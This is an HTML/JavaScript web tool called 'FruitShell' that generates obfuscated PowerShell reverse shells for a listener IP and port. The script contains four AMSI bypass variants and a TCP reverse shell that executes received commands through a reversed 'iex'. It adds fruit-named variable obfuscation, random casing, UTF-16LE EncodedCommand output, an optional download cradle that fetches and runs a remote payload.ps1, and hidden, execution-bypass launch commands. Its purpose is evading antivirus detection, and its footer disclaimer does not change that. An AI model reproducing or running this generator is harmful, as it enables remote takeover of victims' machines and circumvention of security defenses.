<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>🍍 FruitShell · Ultimate Stealth Edition</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            background: linear-gradient(145deg, #0a0f1e 0%, #0c1222 100%);
            font-family: 'Inter', 'Segoe UI', 'Fira Code', monospace;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 1.5rem;
            color: #e2e9ff;
        }
        .shell-card {
            max-width: 1150px;
            width: 100%;
            background: rgba(18, 25, 45, 0.94);
            backdrop-filter: blur(14px);
            border-radius: 2.8rem;
            border: 1px solid rgba(255, 215, 130, 0.3);
            box-shadow: 0 30px 70px -15px rgba(0,0,0,0.75);
            overflow: hidden;
        }
        .fruit-header {
            background: #1e2a3a;
            padding: 1.4rem 2.2rem;
            border-bottom: 3px solid #f4b942;
            display: flex;
            align-items: center;
            flex-wrap: wrap;
            gap: 1rem;
            justify-content: space-between;
        }
        .title-badge {
            display: flex;
            align-items: center;
            gap: 14px;
            font-size: 1.85rem;
            font-weight: 700;
        }
        .title-badge span:first-child { font-size: 2.4rem; filter: drop-shadow(0 2px 6px rgba(0,0,0,0.4)); }
        .title-badge h1 { background: linear-gradient(135deg, #FFD966, #FFB347); -webkit-background-clip: text; color: transparent; }
        .fruit-tag {
            background: #2c3e2f;
            padding: 0.4rem 1.2rem;
            border-radius: 50px;
            font-size: 0.85rem;
            color: #c9e9b0;
            border: 1px solid #84b372;
        }
        .input-panel { padding: 2.2rem 2.2rem 1.8rem; background: #0f1622; }
        .field-group { display: flex; flex-wrap: wrap; gap: 1.6rem; margin-bottom: 1.6rem; }
        .input-field, .select-field { flex: 1; min-width: 220px; }
        .input-field label, .select-field label {
            display: block;
            font-size: 0.82rem;
            text-transform: uppercase;
            letter-spacing: 2px;
            color: #c0cfef;
            margin-bottom: 0.6rem;
        }
        .input-field input, .select-field select {
            width: 100%;
            background: #010a1a;
            border: 2px solid #2a374b;
            border-radius: 60px;
            padding: 1rem 1.4rem;
            font-size: 1.12rem;
            color: #f0f3ff;
        }
        .select-field select { font-family: inherit; }
        .controls {
            display: flex;
            flex-wrap: wrap;
            gap: 1.2rem;
            align-items: center;
            margin: 1.2rem 0;
        }
        .btn {
            padding: 0.8rem 1.9rem;
            border-radius: 50px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.25s;
            border: 1px solid #3a455b;
            font-size: 0.95rem;
        }
        .btn-primary { background: #e68a2e; color: #0a0f1a; border-color: #ffbc6e; }
        .btn-primary:hover { background: #ff9f4a; transform: scale(1.04); }
        .pre-wrap {
            background: #03060e;
            border-radius: 1.6rem;
            border: 1px solid #2f3b4e;
            padding: 1.7rem;
            font-family: 'Fira Code', monospace;
            font-size: 0.81rem;
            line-height: 1.48;
            color: #e2e9ff;
            white-space: pre-wrap;
            overflow-x: auto;
            max-height: 480px;
        }
        .flash { animation: flashAnim 0.9s ease; }
        @keyframes flashAnim { 0%,100% { background:#2a3a1e; } 50% { background:#1e2a1a; } }
        footer {
            background:#090e18;
            padding:1.1rem 2.2rem;
            font-size:0.76rem;
            text-align:center;
            color:#5b6e8c;
            border-top:1px solid #1e293b;
        }
        .status { font-size:0.82rem; background:#1f2a36; padding:0.35rem 1rem; border-radius:30px; }
    </style>
</head>
<body>
<div class="shell-card">
    <div class="fruit-header">
        <div class="title-badge">
            <span>🍒🍊🍉🍍🥝🍓</span>
            <h1>FruitShell · Ultimate Stealth</h1>
        </div>
        <div class="fruit-tag">🍇 AMSI Variants + UTF-16LE + Reversal 🥭</div>
    </div>

    <div class="input-panel">
        <div class="field-group">
            <div class="input-field">
                <label>🍎 LISTENER IP / HOSTNAME</label>
                <input type="text" id="ip" placeholder="10.10.14.2 or attacker.com" spellcheck="false">
            </div>
            <div class="input-field">
                <label>🍊 PORT</label>
                <input type="text" id="port" placeholder="4444" spellcheck="false">
            </div>
        </div>

        <div class="field-group">
            <div class="select-field">
                <label>AMSI Bypass Variant</label>
                <select id="amsiVariant">
                    <option value="0">Classic Concat (A + msiUtils)</option>
                    <option value="1" selected>Double Split (Heavy Fruit Style)</option>
                    <option value="2">Reflected + Random Case</option>
                    <option value="3">Minimal InitFailed Only</option>
                </select>
            </div>
        </div>

        <div class="controls">
            <div style="display:flex; align-items:center; gap:10px;">
                <label>Stealth Level:</label>
                <input type="range" id="stealthLevel" min="1" max="4" value="3" style="width:180px;">
                <span id="levelDisplay" style="font-weight:600; color:#ffcd85;">Level 3 🍉</span>
            </div>
            <label><input type="checkbox" id="ultraMode" checked> Extra Fruit Chaos</label>
            <label><input type="checkbox" id="compressMode"> Compress + EncodedCommand</label>
            <label><input type="checkbox" id="utf16Mode" checked> UTF-16LE Encoding</label>
            <label><input type="checkbox" id="cradleMode"> Use Download Cradle</label>
            <label><input type="checkbox" id="oneLinerMode"> Force One-Liner</label>
        </div>

        <div style="display:flex; gap:1rem; flex-wrap:wrap;">
            <button class="btn btn-primary" id="generateBtn">🍍 GENERATE ULTIMATE FRUIT SHELL 🍍</button>
            <button class="btn" id="copyBtn" disabled>📋 Copy Payload</button>
            <button class="btn" id="copyEncodedBtn" disabled>📋 Copy EncodedCommand</button>
            <button class="btn" id="copyFullBtn" disabled>📋 Copy Full Command</button>
            <button class="btn" id="clearBtn">🧹 Clear</button>
        </div>
    </div>

    <div style="padding:0 2.2rem 2.2rem;">
        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:12px;">
            <span style="background:#2a1f1a; padding:0.35rem 1.1rem; border-radius:25px; font-size:0.8rem; color:#ffcd85;">
                🍬 FRUIT-OBFUSCATED STEALTH PAYLOAD 🍬
            </span>
            <span id="statusHint" class="status">ready</span>
        </div>
        <div id="shell-script" class="pre-wrap">
# Select AMSI variant and click Generate
        </div>
    </div>

    <footer>
        🍌 Multiple AMSI bypass variants • Fruit obfuscation • UTF-16LE • String reversal • Use responsibly on authorized targets only
    </footer>
</div>

<script>
    const fruitBase = ["mango","kiwi","lychee","papaya","guava","dragon","passion","starfruit","durian","jackfruit","rambutan","mangosteen","pitaya","tamarind","persimmon","quince","boysen","elder","goose","currant","pineapple","cherry","banana","orange","lime","lemon"];

    function getRandomFruit(used) {
        let avail = fruitBase.filter(f => !used.has(f));
        if (avail.length === 0) avail = [...fruitBase];
        const picked = avail[Math.floor(Math.random() * avail.length)];
        used.add(picked);
        return picked;
    }

    function randomCase(str) {
        return str.split('').map(c => Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()).join('');
    }

    function obfuscateString(str, level) {
        let result = '';
        const used = new Set();
        for (let char of str) {
            if (Math.random() < 0.4 + level * 0.2) {
                const f = getRandomFruit(used);
                result += `$${f}='${char}';`;
            } else {
                result += `'${char}' + `;
            }
        }
        return result.replace(/\s*\+\s*$/, '');
    }

    function reverseString(s) {
        return s.split('').reverse().join('');
    }

    function getAmsiBypass(variant, stealthLevel) {
        const used = new Set();
        const f = () => getRandomFruit(used);

        if (variant === "0") { // Classic Concat
            return `$a='System.Management.Automation.A';$b='msiUtils';\n$c=[Ref].Assembly.GetType($a+$b);\n$d=$c.GetField('amsiInitFailed','NonPublic,Static');\n$d.SetValue($null,$true);`;
        }
        if (variant === "1") { // Double Split (heavier fruit style)
            let a1 = obfuscateString('System.Management.Automation.', stealthLevel);
            let a2 = obfuscateString('AmsiUtils', stealthLevel);
            return `${a1}$b=${a2};\n$c=[Ref].Assembly.GetType($a+$b);\n$d=$c.GetField('amsiInitFailed','NonPublic,Static');\n$d.SetValue($null,$true);`;
        }
        if (variant === "2") { // Reflected + Random Case
            return `$${f()}=[Ref].Assembly.GetType('${randomCase('System.Management.Automation.AmsiUtils')}');\n$${f()}=$${f()}.GetField('${randomCase('amsiInitFailed')}','NonPublic,Static');\n$${f()}.SetValue($null,$true);`;
        }
        if (variant === "3") { // Minimal
            return `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);`;
        }
        return '';
    }

    function toUtf16LEBase64(str) {
        let utf16le = '';
        for (let i = 0; i < str.length; i++) {
            utf16le += str.charCodeAt(i) + '\0';
        }
        return btoa(utf16le);
    }

    function generateUltimateFruitShell(ip, portStr, stealthLevel, ultra, compress, utf16, cradle, oneLiner, amsiVariant) {
        const used = new Set();
        const f = () => getRandomFruit(used);

        const amsiBypass = getAmsiBypass(amsiVariant, stealthLevel);

        const client = f(); const stream = f(); const writer = f();
        const buffer = f(); const data = f(); const raw = f();

        let ipAssignments = '';
        let ipExprParts = [];
        ip.split('').forEach(char => {
            const v = f();
            ipAssignments += `$${v}='${char}';`;
            ipExprParts.push(`$${v}`);
        });
        const ipExpr = ipExprParts.join('+');

        let portExpr = `'${portStr}'`;
        if (stealthLevel >= 3) portExpr = portStr.split('').map(c => `'${c}'`).join(' + ');

        let iexReversed = reverseString('xei');

        let core = `
${amsiBypass}
$ErrorActionPreference = 'SilentlyContinue';
${ipAssignments}
$${client} = New-Object (${obfuscateString('System.Net.Sockets.TCPClient', stealthLevel)})(${ipExpr}, ${portExpr});
$${stream} = $${client}.GetStream();
$${writer} = New-Object System.IO.StreamWriter($${stream});
$${buffer} = New-Object Byte[] 4096;
while (($${data} = $${stream}.Read($${buffer}, 0, $${buffer}.Length)) -ne 0) {
    $${raw} = (New-Object System.Text.UTF8Encoding).GetString($${buffer}, 0, $${data});
    $exec = &([string]::join('', '${iexReversed}'[(${iexReversed}.Length-1)..0])) $${raw} 2>&1 | Out-String;
    $${writer}.WriteLine($exec); $${writer}.Flush();
}
$${client}.Close();`.trim();

        if (ultra) core = core.replace(/New-Object/g, randomCase('New-Object'));
        if (cradle) core = `IEX((New-Object Net.WebClient).DownloadString('http://${ip}:${portStr}/payload.ps1'));\n` + core;

        if (compress) {
            const encoded = utf16 ? toUtf16LEBase64(core) : btoa(unescape(encodeURIComponent(core)));
            return `powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand ${encoded}`;
        }

        if (oneLiner) core = core.replace(/\s+/g, ' ').trim();

        return core;
    }

    // DOM
    const ipInput = document.getElementById('ip');
    const portInput = document.getElementById('port');
    const stealthSlider = document.getElementById('stealthLevel');
    const levelDisplay = document.getElementById('levelDisplay');
    const amsiSelect = document.getElementById('amsiVariant');
    const ultraChk = document.getElementById('ultraMode');
    const compressChk = document.getElementById('compressMode');
    const utf16Chk = document.getElementById('utf16Mode');
    const cradleChk = document.getElementById('cradleMode');
    const oneLinerChk = document.getElementById('oneLinerMode');
    const genBtn = document.getElementById('generateBtn');
    const copyBtn = document.getElementById('copyBtn');
    const copyEncodedBtn = document.getElementById('copyEncodedBtn');
    const copyFullBtn = document.getElementById('copyFullBtn');
    const clearBtn = document.getElementById('clearBtn');
    const outputArea = document.getElementById('shell-script');
    const statusHint = document.getElementById('statusHint');

    stealthSlider.addEventListener('input', () => {
        const lvl = parseInt(stealthSlider.value);
        const emojis = ['🥭','🍉','🍓','🍒'];
        levelDisplay.textContent = `Level ${lvl} ${emojis[lvl-1]}`;
    });

    function handleGenerate() {
        const ip = ipInput.value.trim();
        const portStr = portInput.value.trim();
        const amsiVariant = amsiSelect.value;

        if (!ip) return outputArea.textContent = '⚠️ Enter IP/hostname', statusHint.textContent = 'missing ip';
        if (!portStr || isNaN(parseInt(portStr)) || parseInt(portStr) < 1 || parseInt(portStr) > 65535) {
            outputArea.textContent = '⚠️ Port must be 1–65535';
            statusHint.textContent = 'invalid port';
            return;
        }

        try {
            const payload = generateUltimateFruitShell(
                ip, portStr,
                parseInt(stealthSlider.value),
                ultraChk.checked,
                compressChk.checked,
                utf16Chk.checked,
                cradleChk.checked,
                oneLinerChk.checked,
                amsiVariant
            );

            outputArea.textContent = payload;
            outputArea.classList.add('flash');
            setTimeout(() => outputArea.classList.remove('flash'), 1000);

            copyBtn.disabled = copyEncodedBtn.disabled = copyFullBtn.disabled = false;
            statusHint.textContent = '🍍 fruit shell with selected AMSI variant ready!';
            setTimeout(() => statusHint.textContent = 'ready', 2800);
        } catch (e) {
            outputArea.textContent = `Error: ${e.message}`;
            statusHint.textContent = 'error';
        }
    }

    function copyToClipboard(text, button, msg = '✅ Copied!') {
        navigator.clipboard.writeText(text).then(() => {
            const orig = button.textContent;
            button.textContent = msg;
            setTimeout(() => button.textContent = orig, 1800);
        });
    }

    genBtn.addEventListener('click', handleGenerate);
    copyBtn.addEventListener('click', () => copyToClipboard(outputArea.textContent, copyBtn));
    copyEncodedBtn.addEventListener('click', () => {
        const encoded = generateUltimateFruitShell(ipInput.value.trim(), portInput.value.trim(), parseInt(stealthSlider.value), ultraChk.checked, true, utf16Chk.checked, cradleChk.checked, oneLinerChk.checked, amsiSelect.value);
        copyToClipboard(encoded, copyEncodedBtn, '✅ EncodedCommand Copied!');
    });
    copyFullBtn.addEventListener('click', () => {
        const full = `powershell -NoP -NonI -W Hidden -Exec Bypass -c "${outputArea.textContent.replace(/"/g, '`"')}"`;
        copyToClipboard(full, copyFullBtn, '✅ Full Command Copied!');
    });

    clearBtn.addEventListener('click', () => {
        ipInput.value = ''; portInput.value = '';
        outputArea.textContent = '# Select AMSI variant and generate... 🍍';
        copyBtn.disabled = copyEncodedBtn.disabled = copyFullBtn.disabled = true;
        statusHint.textContent = 'cleared';
        setTimeout(() => statusHint.textContent = 'ready', 1200);
    });

    [ipInput, portInput].forEach(el => el.addEventListener('keypress', e => { if (e.key === 'Enter') handleGenerate(); }));
</script>
</body>
</html>
